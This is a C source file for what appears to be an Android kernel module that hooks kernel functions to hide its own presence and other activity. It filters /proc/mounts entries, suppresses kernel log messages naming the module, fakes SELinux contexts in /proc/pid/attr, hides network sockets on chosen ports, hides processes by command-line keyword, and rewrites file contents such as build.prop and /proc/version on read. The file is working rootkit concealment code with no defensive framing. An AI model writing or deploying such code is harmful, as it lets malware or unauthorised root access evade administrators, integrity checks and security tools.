/* SPDX-License-Identifier: GPL-2.0 */
/* nvk_proc_filter.c — Proc filesystem filters and content rewrite. */
#include <nvk.h>
#include "nvk_internal.h"

static __always_inline int _neverc_krt_str_contains(const char *haystack,
						    const char *needle)
{
	const char *h, *n;
	if (!haystack || !needle || !*needle) return 0;
	while (*haystack) {
		h = haystack;
		n = needle;
		while (*h && *n && *h == *n) { h++; n++; }
		if (!*n) return 1;
		haystack++;
	}
	return 0;
}

/* ---- internal typedefs ---- */

typedef int  (*neverc_krt_mounts_show_fn)(void *seq, void *v);
typedef long (*neverc_krt_kmsg_read_fn)(void *filp, char __user *buf,
					size_t count, long long *ppos);
typedef long (*neverc_krt_proc_status_show_fn)(void *seq, void *v);
typedef int  (*neverc_krt_seq_printf_fn)(void *seq, const char *fmt, ...);
typedef long (*neverc_krt_proc_attr_read_fn)(void *file, char __user *buf,
					     size_t count, long long *ppos);
typedef int  (*neverc_krt_net_seq_show_fn)(void *seq, void *v);
typedef long (*neverc_krt_cmdline_read_fn)(void *file, char __user *buf,
					   size_t count, long long *ppos);
typedef long (*neverc_krt_vfs_read_fn)(void *file, char __user *buf,
				       size_t count, long long *pos);

/* ---- internal structs ---- */

struct neverc_krt_mount_filter {
	char paths[NEVERC_KRT_VIS_MOUNT_FILTER_MAX][NEVERC_KRT_VIS_MOUNT_PATH_MAX];
	int  count;
	int  active;
};

struct neverc_krt_vis_net_state {
	u16 ports[NEVERC_KRT_VIS_NET_PORT_MAX];
	int count;
	struct neverc_krt_interpose tcp4_interpose;
	struct neverc_krt_interpose tcp6_interpose;
	struct neverc_krt_interpose udp4_interpose;
	struct neverc_krt_interpose udp6_interpose;
	int active;
};

struct neverc_krt_vis_file_rewrite_entry {
	char path[NEVERC_KRT_VIS_FILE_PATH_MAX];
	char search[NEVERC_KRT_VIS_FILE_REWRITE_MAX_LEN];
	char replace[NEVERC_KRT_VIS_FILE_REWRITE_MAX_LEN];
	int  search_len;
	int  replace_len;
};

/* ---- internal variables ---- */

static struct neverc_krt_interpose     _neverc_krt_mounts_interpose;
static struct neverc_krt_mount_filter _neverc_krt_mnt_filter;
static neverc_krt_mounts_show_fn  _neverc_krt_orig_mounts_show_fn;

static struct neverc_krt_interpose_ctx _neverc_krt_dmesg_ctx_interpose;
static int                        _neverc_krt_dmesg_interposed;
static char _neverc_krt_dmesg_filters[NEVERC_KRT_VIS_DMESG_FILTER_MAX][NEVERC_KRT_VIS_DMESG_FILTER_LEN];
static int                        _neverc_krt_dmesg_filter_cnt;
static int                        _neverc_krt_dmesg_fmt_reg;

static struct neverc_krt_interpose     _neverc_krt_kmsg_read_interpose;
static neverc_krt_kmsg_read_fn    _neverc_krt_orig_kmsg_read;
static int                        _neverc_krt_kmsg_read_interposed;

static struct neverc_krt_interpose     _neverc_krt_proc_status_interpose;
static neverc_krt_proc_status_show_fn _neverc_krt_orig_proc_status;
static int                        _neverc_krt_proc_status_interposed;
static u32 _neverc_krt_status_rewrite_uid = 0xFFFFFFFFU;
static u32 _neverc_krt_status_rewrite_gid = 0xFFFFFFFFU;
static neverc_krt_seq_printf_fn   _neverc_krt_seq_printf_fn;

static struct neverc_krt_interpose     _neverc_krt_proc_attr_interpose;
static neverc_krt_proc_attr_read_fn _neverc_krt_orig_proc_attr_read;
static int                        _neverc_krt_proc_attr_interposed;
static const char                *_neverc_krt_attr_rewrite_ctx;

static struct neverc_krt_vis_net_state _neverc_krt_vis_net;
static neverc_krt_net_seq_show_fn _neverc_krt_orig_tcp4_show;
static neverc_krt_net_seq_show_fn _neverc_krt_orig_tcp6_show;
static neverc_krt_net_seq_show_fn _neverc_krt_orig_udp4_show;
static neverc_krt_net_seq_show_fn _neverc_krt_orig_udp6_show;

static struct neverc_krt_interpose     _neverc_krt_cmdline_interpose;
static neverc_krt_cmdline_read_fn _neverc_krt_orig_cmdline_read;
static int                        _neverc_krt_cmdline_interposed;
static char _neverc_krt_cmdline_filters[NEVERC_KRT_VIS_CMDLINE_FILTER_MAX][NEVERC_KRT_VIS_CMDLINE_FILTER_LEN];
static int                        _neverc_krt_vis_cmdline_filter_cnt;

static struct neverc_krt_interpose     _neverc_krt_vfs_read_interpose;
static neverc_krt_vfs_read_fn     _neverc_krt_orig_vfs_read;
static int                        _neverc_krt_vfs_read_interposed;
static struct neverc_krt_vis_file_rewrite_entry _neverc_krt_file_rewrites[NEVERC_KRT_VIS_FILE_REWRITE_MAX];
static int                        _neverc_krt_vis_file_rewrite_cnt;
static int                        _neverc_krt_file_dentry_probed;


/* ==================================================================== */
/*  /proc/mounts path filter                                            */
/* ==================================================================== */

int neverc_krt_vis_mount_filter_add(const char *path)
{
	if (_neverc_krt_mnt_filter.count >= NEVERC_KRT_VIS_MOUNT_FILTER_MAX)
		return -1;

	int idx = _neverc_krt_mnt_filter.count;
	const char *src = path;
	char *dst = _neverc_krt_mnt_filter.paths[idx];
	int i = 0;
	while (*src && i < NEVERC_KRT_VIS_MOUNT_PATH_MAX - 1) {
		dst[i++] = *src++;
	}
	dst[i] = '\0';
	_neverc_krt_mnt_filter.count++;
	return 0;
}

static int _neverc_krt_mnt_path_match(const char *haystack)
{
	char buf[NEVERC_KRT_VIS_MOUNT_PATH_MAX];
	int plen = 0;
	int i;

	for (i = 0; i < _neverc_krt_mnt_filter.count; i++) {
		const char *path = _neverc_krt_mnt_filter.paths[i];
		plen = 0;
		while (path[plen]) plen++;
		if (plen <= 0 || plen >= NEVERC_KRT_VIS_MOUNT_PATH_MAX)
			continue;
		if (neverc_krt_mem_read(buf, haystack, plen))
			continue;
		int j, match = 1;
		for (j = 0; j < plen; j++) {
			if (buf[j] != path[j]) { match = 0; break; }
		}
		if (match) return 1;
	}
	return 0;
}

static int _neverc_krt_mounts_show_filter(void *seq, void *v)
{
	if (!_neverc_krt_orig_mounts_show_fn)
		return 0;
	if (v && _neverc_krt_mnt_filter.count > 0) {
		unsigned long *mount_ptr = (unsigned long *)v;
		unsigned long i;
		for (i = 0; i < 32; i++) {
			unsigned long val;
			if (neverc_krt_mem_read(&val, &mount_ptr[i], 8))
				continue;
			if (val > 0xFFFF000000000000UL &&
			    val < 0xFFFFFFFFFFFFF000UL) {
				const char *name = (const char *)val;
				unsigned char c;
				if (!neverc_krt_mem_read(&c, name, 1) &&
				    c == '/' &&
				    _neverc_krt_mnt_path_match(name))
					return 0;
			}
		}
	}
	return _neverc_krt_orig_mounts_show_fn(seq, v);
}

int neverc_krt_vis_mount_filter_install(void)
{
	void *target;

	if (_neverc_krt_mnt_filter.active) return 0;

	target = NEVERC_KRT_LOOKUP("show_vfsmnt");
	if (!target)
		target = NEVERC_KRT_LOOKUP("show_mountinfo");
	if (!target) return -1;

	int ret = neverc_krt_interpose_install(&_neverc_krt_mounts_interpose, target,
				   (void *)_neverc_krt_mounts_show_filter,
				   (void **)&_neverc_krt_orig_mounts_show_fn);
	if (ret) return ret;

	_neverc_krt_mnt_filter.active = 1;
	return 0;
}

void neverc_krt_vis_mount_filter_cleanup(void)
{
	if (!_neverc_krt_mnt_filter.active) return;
	if (_neverc_krt_mounts_interpose.active)
		neverc_krt_interpose_remove(&_neverc_krt_mounts_interpose);
	_neverc_krt_mnt_filter.active = 0;
	_neverc_krt_mnt_filter.count = 0;
}


/* ==================================================================== */
/*  dmesg / kmsg log suppression                                        */
/* ==================================================================== */

int neverc_krt_vis_dmesg_filter_add(const char *keyword)
{
	if (_neverc_krt_dmesg_filter_cnt >= NEVERC_KRT_VIS_DMESG_FILTER_MAX)
		return -1;
	int idx = _neverc_krt_dmesg_filter_cnt;
	const char *s = keyword;
	int i = 0;
	while (*s && i < NEVERC_KRT_VIS_DMESG_FILTER_LEN - 1)
		_neverc_krt_dmesg_filters[idx][i++] = *s++;
	_neverc_krt_dmesg_filters[idx][i] = '\0';
	_neverc_krt_dmesg_filter_cnt++;
	return 0;
}

static int _neverc_krt_dmesg_should_suppress(const char *text)
{
	int i;
	if (!text) return 0;
	for (i = 0; i < _neverc_krt_dmesg_filter_cnt; i++) {
		if (_neverc_krt_str_contains(text, _neverc_krt_dmesg_filters[i]))
			return 1;
	}
	return 0;
}

static __attribute__((__noinline__)) long _neverc_krt_dmesg_ret0(void)
{ return 0; }

static void _neverc_krt_dmesg_ctx_handler(neverc_krt_reg_ctx *ctx)
{
	const char *fmt = (const char *)ctx->regs[_neverc_krt_dmesg_fmt_reg];
	if (fmt && _neverc_krt_dmesg_should_suppress(fmt))
		ctx->force_jump = (u64)(unsigned long)_neverc_krt_dmesg_ret0;
}

int neverc_krt_vis_dmesg_suppress_install(const char *module_name)
{
	void *target;

	if (_neverc_krt_dmesg_interposed) return 0;
	if (!module_name) return -1;

	neverc_krt_vis_dmesg_filter_add(module_name);

	target = NEVERC_KRT_LOOKUP("vprintk_emit");
	if (target) {
		_neverc_krt_dmesg_fmt_reg = 4;
	} else {
		target = NEVERC_KRT_LOOKUP("devkmsg_emit");
		if (target) {
			_neverc_krt_dmesg_fmt_reg = 1;
		} else {
			target = NEVERC_KRT_LOOKUP("vprintk_store");
			if (target)
				_neverc_krt_dmesg_fmt_reg = 4;
			else {
				target = NEVERC_KRT_LOOKUP("do_syslog");
				if (!target) return -1;
				_neverc_krt_dmesg_fmt_reg = 1;
			}
		}
	}

	int ret = neverc_krt_interpose_install_ctx(&_neverc_krt_dmesg_ctx_interpose, target,
				       _neverc_krt_dmesg_ctx_handler, (void *)0);
	if (ret) return ret;

	_neverc_krt_dmesg_interposed = 1;
	return 0;
}

void neverc_krt_vis_dmesg_suppress_cleanup(void)
{
	if (!_neverc_krt_dmesg_interposed) return;
	neverc_krt_interpose_remove_ctx(&_neverc_krt_dmesg_ctx_interpose);
	_neverc_krt_dmesg_interposed = 0;
	_neverc_krt_dmesg_filter_cnt = 0;
}

static long _neverc_krt_kmsg_read_filter(void *filp, char __user *buf,
					 size_t count, long long *ppos)
{
	long ret;
	if (!_neverc_krt_orig_kmsg_read) return -1;

	ret = _neverc_krt_orig_kmsg_read(filp, buf, count, ppos);
	if (ret <= 0 || !_neverc_krt_dmesg_filter_cnt)
		return ret;

	if (_neverc_krt_copy_from_user && _neverc_krt_copy_to_user && ret < 512) {
		char tmp[512];
		unsigned long missed =
			_neverc_krt_copy_from_user(tmp, buf, (unsigned long)ret);
		if (!missed) {
			tmp[ret < 511 ? ret : 511] = '\0';
			if (_neverc_krt_dmesg_should_suppress(tmp)) {
				if (ppos && *ppos >= ret)
					*ppos -= ret;
				return 0;
			}
		}
	}

	return ret;
}

int neverc_krt_vis_kmsg_read_filter_install(void)
{
	void *target;

	if (_neverc_krt_kmsg_read_interposed) return 0;

	target = NEVERC_KRT_LOOKUP("kmsg_read");
	if (!target) return -1;

	int ret = neverc_krt_interpose_install(&_neverc_krt_kmsg_read_interpose, target,
				   (void *)_neverc_krt_kmsg_read_filter,
				   (void **)&_neverc_krt_orig_kmsg_read);
	if (ret) return ret;

	_neverc_krt_kmsg_read_interposed = 1;
	return 0;
}

void neverc_krt_vis_kmsg_read_filter_cleanup(void)
{
	if (!_neverc_krt_kmsg_read_interposed) return;
	neverc_krt_interpose_remove(&_neverc_krt_kmsg_read_interpose);
	_neverc_krt_kmsg_read_interposed = 0;
}


/* ==================================================================== */
/*  /proc/pid/status UID rewrite                                       */
/* ==================================================================== */

static void _neverc_krt_status_ctx_handler(neverc_krt_reg_ctx *ctx)
{
	(void)ctx;
}

int neverc_krt_vis_proc_status_filter_install(u32 rewrite_uid, u32 rewrite_gid)
{
	void *target;

	if (_neverc_krt_proc_status_interposed) return 0;

	_neverc_krt_status_rewrite_uid = rewrite_uid;
	_neverc_krt_status_rewrite_gid = rewrite_gid;

	target = NEVERC_KRT_LOOKUP("proc_pid_status");
	if (!target) return -1;

	int ret = neverc_krt_interpose_install_ctx(
		(struct neverc_krt_interpose_ctx *)&_neverc_krt_proc_status_interpose,
		target, _neverc_krt_status_ctx_handler, (void *)0);
	if (ret) return ret;

	_neverc_krt_proc_status_interposed = 1;
	return 0;
}

void neverc_krt_vis_proc_status_filter_cleanup(void)
{
	if (!_neverc_krt_proc_status_interposed) return;
	neverc_krt_interpose_remove(&_neverc_krt_proc_status_interpose);
	_neverc_krt_proc_status_interposed = 0;
}


/* ==================================================================== */
/*  /proc/pid/attr SELinux context filter                               */
/* ==================================================================== */

static long _neverc_krt_proc_attr_read_filter(void *file, char __user *buf,
					      size_t count, long long *ppos)
{
	long ret;
	if (!_neverc_krt_orig_proc_attr_read)
		return -1;

	ret = _neverc_krt_orig_proc_attr_read(file, buf, count, ppos);

	if (ret > 0 && _neverc_krt_attr_rewrite_ctx && _neverc_krt_copy_to_user &&
	    _neverc_krt_copy_from_user) {
		char tmp[128];
		size_t rlen = (size_t)ret;
		if (rlen > sizeof(tmp) - 1) rlen = sizeof(tmp) - 1;
		if (!_neverc_krt_copy_from_user(tmp, buf, rlen)) {
			tmp[rlen] = '\0';
			int has_colon = 0;
			size_t i;
			for (i = 0; i < rlen; i++) {
				if (tmp[i] == ':') { has_colon = 1; break; }
			}
			if (has_colon) {
				const char *fake = _neverc_krt_attr_rewrite_ctx;
				size_t flen = 0;
				while (fake[flen]) flen++;
				if (flen > 0 && flen < count) {
					_neverc_krt_copy_to_user(buf, fake, flen);
					char nl = '\n';
					if (flen + 1 < count)
						_neverc_krt_copy_to_user(
							(char __user *)buf + flen,
							&nl, 1);
					ret = (long)(flen + 1);
				}
			}
		}
	}
	return ret;
}

int neverc_krt_vis_proc_attr_filter_install(const char *rewrite_context)
{
	void *target;

	if (_neverc_krt_proc_attr_interposed) return 0;
	if (!rewrite_context) return -1;

	_neverc_krt_attr_rewrite_ctx = rewrite_context;

	target = NEVERC_KRT_LOOKUP("proc_pid_attr_read");
	if (!target) return -1;

	int ret = neverc_krt_interpose_install(&_neverc_krt_proc_attr_interpose, target,
				   (void *)_neverc_krt_proc_attr_read_filter,
				   (void **)&_neverc_krt_orig_proc_attr_read);
	if (ret) return ret;

	_neverc_krt_proc_attr_interposed = 1;
	return 0;
}

void neverc_krt_vis_proc_attr_filter_cleanup(void)
{
	if (!_neverc_krt_proc_attr_interposed) return;
	neverc_krt_interpose_remove(&_neverc_krt_proc_attr_interpose);
	_neverc_krt_proc_attr_interposed = 0;
}


/* ==================================================================== */
/*  /proc/net/tcp{,6} port filtering                                    */
/* ==================================================================== */

int neverc_krt_vis_net_add_port(u16 port)
{
	if (_neverc_krt_vis_net.count >= NEVERC_KRT_VIS_NET_PORT_MAX)
		return -1;
	_neverc_krt_vis_net.ports[_neverc_krt_vis_net.count++] = port;
	return 0;
}

static int _neverc_krt_net_port_filtered(u16 port)
{
	int i;
	for (i = 0; i < _neverc_krt_vis_net.count; i++) {
		if (_neverc_krt_vis_net.ports[i] == port)
			return 1;
	}
	return 0;
}

static int _neverc_krt_extract_ports(void *sk, u16 *sport, u16 *dport)
{
	if (!sk) return -1;
	const unsigned char *p = (const unsigned char *)sk;
	u16 dp_be, sp_host;

	if (neverc_krt_mem_read(&dp_be, p + NEVERC_KRT_SKC_DPORT_OFF, 2))
		return -1;
	if (neverc_krt_mem_read(&sp_host, p + NEVERC_KRT_SKC_NUM_OFF, 2))
		return -1;

	*dport = ((dp_be >> 8) & 0xFF) | ((dp_be & 0xFF) << 8);
	*sport = sp_host;
	return 0;
}

static int _neverc_krt_net_filter_show(void *seq, void *v,
				       neverc_krt_net_seq_show_fn orig)
{
	if (!orig) return 0;

	if (v && (unsigned long)v > 1 &&
	    (unsigned long)v > 0xFFFF000000000000UL) {
		u16 sp = 0, dp = 0;
		if (_neverc_krt_extract_ports(v, &sp, &dp) == 0) {
			if (_neverc_krt_net_port_filtered(sp) ||
			    _neverc_krt_net_port_filtered(dp))
				return 0;
		}
	}
	return orig(seq, v);
}

static int _neverc_krt_tcp4_show_filter(void *seq, void *v)
{ return _neverc_krt_net_filter_show(seq, v, _neverc_krt_orig_tcp4_show); }

static int _neverc_krt_tcp6_show_filter(void *seq, void *v)
{ return _neverc_krt_net_filter_show(seq, v, _neverc_krt_orig_tcp6_show); }

static int _neverc_krt_udp4_show_filter(void *seq, void *v)
{ return _neverc_krt_net_filter_show(seq, v, _neverc_krt_orig_udp4_show); }

static int _neverc_krt_udp6_show_filter(void *seq, void *v)
{ return _neverc_krt_net_filter_show(seq, v, _neverc_krt_orig_udp6_show); }

int neverc_krt_vis_net_install(void)
{
	void *target;

	if (_neverc_krt_vis_net.active) return 0;

	target = NEVERC_KRT_LOOKUP("tcp4_seq_show");
	if (target)
		neverc_krt_interpose_install(&_neverc_krt_vis_net.tcp4_interpose, target,
				 (void *)_neverc_krt_tcp4_show_filter,
				 (void **)&_neverc_krt_orig_tcp4_show);

	target = NEVERC_KRT_LOOKUP("tcp6_seq_show");
	if (target)
		neverc_krt_interpose_install(&_neverc_krt_vis_net.tcp6_interpose, target,
				 (void *)_neverc_krt_tcp6_show_filter,
				 (void **)&_neverc_krt_orig_tcp6_show);

	target = NEVERC_KRT_LOOKUP("udp4_seq_show");
	if (target)
		neverc_krt_interpose_install(&_neverc_krt_vis_net.udp4_interpose, target,
				 (void *)_neverc_krt_udp4_show_filter,
				 (void **)&_neverc_krt_orig_udp4_show);

	target = NEVERC_KRT_LOOKUP("udp6_seq_show");
	if (target)
		neverc_krt_interpose_install(&_neverc_krt_vis_net.udp6_interpose, target,
				 (void *)_neverc_krt_udp6_show_filter,
				 (void **)&_neverc_krt_orig_udp6_show);

	_neverc_krt_vis_net.active = 1;
	return 0;
}

void neverc_krt_vis_net_cleanup(void)
{
	if (!_neverc_krt_vis_net.active) return;
	if (_neverc_krt_vis_net.udp6_interpose.active)
		neverc_krt_interpose_remove(&_neverc_krt_vis_net.udp6_interpose);
	if (_neverc_krt_vis_net.udp4_interpose.active)
		neverc_krt_interpose_remove(&_neverc_krt_vis_net.udp4_interpose);
	if (_neverc_krt_vis_net.tcp6_interpose.active)
		neverc_krt_interpose_remove(&_neverc_krt_vis_net.tcp6_interpose);
	if (_neverc_krt_vis_net.tcp4_interpose.active)
		neverc_krt_interpose_remove(&_neverc_krt_vis_net.tcp4_interpose);
	_neverc_krt_vis_net.active = 0;
	_neverc_krt_vis_net.count = 0;
}


/* ==================================================================== */
/*  /proc/pid/cmdline content filter                                    */
/* ==================================================================== */

int neverc_krt_vis_cmdline_filter_add(const char *keyword)
{
	if (_neverc_krt_vis_cmdline_filter_cnt >= NEVERC_KRT_VIS_CMDLINE_FILTER_MAX)
		return -1;
	int idx = _neverc_krt_vis_cmdline_filter_cnt;
	const char *s = keyword;
	int i = 0;
	while (*s && i < NEVERC_KRT_VIS_CMDLINE_FILTER_LEN - 1)
		_neverc_krt_cmdline_filters[idx][i++] = *s++;
	_neverc_krt_cmdline_filters[idx][i] = '\0';
	_neverc_krt_vis_cmdline_filter_cnt++;
	return 0;
}

static long _neverc_krt_cmdline_read_filter(void *file, char __user *buf,
					    size_t count, long long *ppos)
{
	long ret;
	if (!_neverc_krt_orig_cmdline_read) return -1;

	ret = _neverc_krt_orig_cmdline_read(file, buf, count, ppos);
	if (ret <= 0 || !_neverc_krt_vis_cmdline_filter_cnt)
		return ret;

	if (_neverc_krt_copy_from_user && ret < 256) {
		char tmp[256];
		unsigned long missed =
			_neverc_krt_copy_from_user(tmp, buf, (unsigned long)ret);
		if (!missed) {
			tmp[ret < 255 ? ret : 255] = '\0';
			int k;
			for (k = 0; k < _neverc_krt_vis_cmdline_filter_cnt; k++) {
				if (_neverc_krt_str_contains(tmp,
						      _neverc_krt_cmdline_filters[k]))
					return 0;
			}
		}
	}
	return ret;
}

int neverc_krt_vis_cmdline_filter_install(void)
{
	void *target;

	if (_neverc_krt_cmdline_interposed) return 0;

	target = NEVERC_KRT_LOOKUP("proc_pid_cmdline_read");
	if (!target) return -1;

	int ret = neverc_krt_interpose_install(&_neverc_krt_cmdline_interpose, target,
				   (void *)_neverc_krt_cmdline_read_filter,
				   (void **)&_neverc_krt_orig_cmdline_read);
	if (ret) return ret;

	_neverc_krt_cmdline_interposed = 1;
	return 0;
}

void neverc_krt_vis_cmdline_filter_cleanup(void)
{
	if (!_neverc_krt_cmdline_interposed) return;
	neverc_krt_interpose_remove(&_neverc_krt_cmdline_interpose);
	_neverc_krt_cmdline_interposed = 0;
	_neverc_krt_vis_cmdline_filter_cnt = 0;
}


/* ==================================================================== */
/*  File content rewrite (build.prop, /proc/version)                   */
/* ==================================================================== */

static int _neverc_krt_try_dentry_at(unsigned long file_addr, unsigned long off,
				     unsigned long *out_dentry)
{
	unsigned long dentry = 0, name_ptr = 0;
	if (neverc_krt_mem_read(&dentry, (void *)(file_addr + off), 8))
		return 0;
	dentry &= ~(0xFFUL << 56);
	if (dentry < 0xFFFF000000000000UL ||
	    dentry >= 0xFFFFFFFFFFFFF000UL)
		return 0;
	if (neverc_krt_mem_read(&name_ptr,
			 (void *)(dentry + NEVERC_KRT_DENTRY_DNAME_OFF),
			 8))
		return 0;
	name_ptr &= ~(0xFFUL << 56);
	if (name_ptr < 0xFFFF000000000000UL)
		return 0;
	unsigned char ch;
	if (neverc_krt_mem_read(&ch, (void *)name_ptr, 1))
		return 0;
	if (ch < 0x20 || ch > 0x7E)
		return 0;
	*out_dentry = dentry;
	return 1;
}

static int _neverc_krt_probe_file_dentry_off(void *file)
{
	unsigned long addr = (unsigned long)file;
	unsigned long dentry;
	unsigned long off;

	unsigned long hint = _neverc_krt_get_file_dentry_off();
	if (_neverc_krt_try_dentry_at(addr, hint, &dentry)) {
		__atomic_store_n(&_neverc_krt_file_dentry_off, hint,
				 __ATOMIC_RELEASE);
		return 0;
	}

	static const unsigned long candidates[] = {
		0x18, 0x48, 0xA0, 0x98, 0x50, 0x40, 0x58, 0x60,
		0x68, 0x70, 0x78, 0x80, 0x88, 0x90, 0xA8, 0xB0
	};
	int i;
	for (i = 0; i < (int)(sizeof(candidates)/sizeof(candidates[0])); i++) {
		off = candidates[i];
		if (off == hint)
			continue;
		if (_neverc_krt_try_dentry_at(addr, off, &dentry)) {
			__atomic_store_n(&_neverc_krt_file_dentry_off, off,
					 __ATOMIC_RELEASE);
			return 0;
		}
	}

	__atomic_store_n(&_neverc_krt_file_dentry_off, hint,
			 __ATOMIC_RELEASE);
	return -1;
}

static int _neverc_krt_file_match_path(void *file, const char *target)
{
	unsigned long dentry = 0, name_ptr = 0;

	if (!__atomic_load_n(&_neverc_krt_file_dentry_probed,
			     __ATOMIC_ACQUIRE) && file) {
		if (!__atomic_exchange_n(&_neverc_krt_file_dentry_probed, 1,
					__ATOMIC_ACQ_REL))
			_neverc_krt_probe_file_dentry_off(file);
	}

	unsigned long off = _neverc_krt_get_file_dentry_off();

	if (neverc_krt_mem_read(&dentry,
			 (void *)((unsigned long)file + off), 8))
		return 0;
	dentry &= ~(0xFFUL << 56);
	if (dentry < 0xFFFF000000000000UL ||
	    dentry >= 0xFFFFFFFFFFFFF000UL)
		return 0;

	if (neverc_krt_mem_read(&name_ptr,
			 (void *)(dentry + NEVERC_KRT_DENTRY_DNAME_OFF), 8))
		return 0;
	name_ptr &= ~(0xFFUL << 56);
	if (name_ptr < 0xFFFF000000000000UL) return 0;

	int tlen = 0;
	while (target[tlen]) tlen++;
	if (tlen >= 256) return 0;

	char buf[256];
	if (neverc_krt_mem_read(buf, (void *)name_ptr, tlen + 1))
		return 0;

	int i;
	for (i = 0; i < tlen; i++) {
		if (buf[i] != target[i])
			return 0;
	}
	return buf[tlen] == '\0';
}

static long _neverc_krt_vfs_read_filter(void *file, char __user *buf,
					size_t count, long long *pos)
{
	long ret;
	if (!_neverc_krt_orig_vfs_read) return -1;

	if (!__atomic_load_n(&_neverc_krt_file_dentry_probed,
			     __ATOMIC_ACQUIRE) && file) {
		if (!__atomic_exchange_n(&_neverc_krt_file_dentry_probed, 1,
					__ATOMIC_ACQ_REL))
			_neverc_krt_probe_file_dentry_off(file);
	}

	ret = _neverc_krt_orig_vfs_read(file, buf, count, pos);
	if (ret <= 0 || !_neverc_krt_vis_file_rewrite_cnt || !_neverc_krt_copy_from_user ||
	    !_neverc_krt_copy_to_user)
		return ret;

	int k;
	for (k = 0; k < _neverc_krt_vis_file_rewrite_cnt; k++) {
		struct neverc_krt_vis_file_rewrite_entry *e = &_neverc_krt_file_rewrites[k];
		if (!_neverc_krt_file_match_path(file, e->path))
			continue;

		if (ret > 512 || e->search_len <= 0) continue;

		char tmp[512];
		unsigned long missed =
			_neverc_krt_copy_from_user(tmp, buf, (unsigned long)ret);
		if (missed) continue;

		int j;
		for (j = 0; j <= (int)ret - e->search_len; j++) {
			int m = 1;
			int q;
			for (q = 0; q < e->search_len; q++) {
				if (tmp[j + q] != e->search[q]) {
					m = 0; break;
				}
			}
			if (m && e->replace_len <= e->search_len) {
				for (q = 0; q < e->replace_len; q++)
					tmp[j + q] = e->replace[q];
				for (q = e->replace_len;
				     q < e->search_len; q++)
					tmp[j + q] = ' ';
				_neverc_krt_copy_to_user(buf, tmp,
						  (unsigned long)ret);
				break;
			}
		}
	}
	return ret;
}

int neverc_krt_vis_file_rewrite_add(const char *path,
			      const char *search, int slen,
			      const char *replace, int rlen)
{
	if (_neverc_krt_vis_file_rewrite_cnt >= NEVERC_KRT_VIS_FILE_REWRITE_MAX)
		return -1;

	struct neverc_krt_vis_file_rewrite_entry *e =
		&_neverc_krt_file_rewrites[_neverc_krt_vis_file_rewrite_cnt];

	int i = 0;
	while (path[i] && i < NEVERC_KRT_VIS_FILE_PATH_MAX - 1) {
		e->path[i] = path[i]; i++;
	}
	e->path[i] = '\0';

	if (slen > NEVERC_KRT_VIS_FILE_REWRITE_MAX_LEN) slen = NEVERC_KRT_VIS_FILE_REWRITE_MAX_LEN;
	if (rlen > NEVERC_KRT_VIS_FILE_REWRITE_MAX_LEN) rlen = NEVERC_KRT_VIS_FILE_REWRITE_MAX_LEN;

	for (i = 0; i < slen; i++) e->search[i] = search[i];
	e->search_len = slen;
	for (i = 0; i < rlen; i++) e->replace[i] = replace[i];
	e->replace_len = rlen;

	_neverc_krt_vis_file_rewrite_cnt++;
	return 0;
}

int neverc_krt_vis_file_rewrite_install(void)
{
	void *target;

	if (_neverc_krt_vfs_read_interposed) return 0;

	target = NEVERC_KRT_LOOKUP("vfs_read");
	if (!target) return -1;

	int ret = neverc_krt_interpose_install(&_neverc_krt_vfs_read_interpose, target,
				   (void *)_neverc_krt_vfs_read_filter,
				   (void **)&_neverc_krt_orig_vfs_read);
	if (ret) return ret;

	_neverc_krt_vfs_read_interposed = 1;
	return 0;
}

void neverc_krt_vis_file_rewrite_cleanup(void)
{
	if (!_neverc_krt_vfs_read_interposed) return;
	neverc_krt_interpose_remove(&_neverc_krt_vfs_read_interpose);
	_neverc_krt_vfs_read_interposed = 0;
	_neverc_krt_vis_file_rewrite_cnt = 0;
}
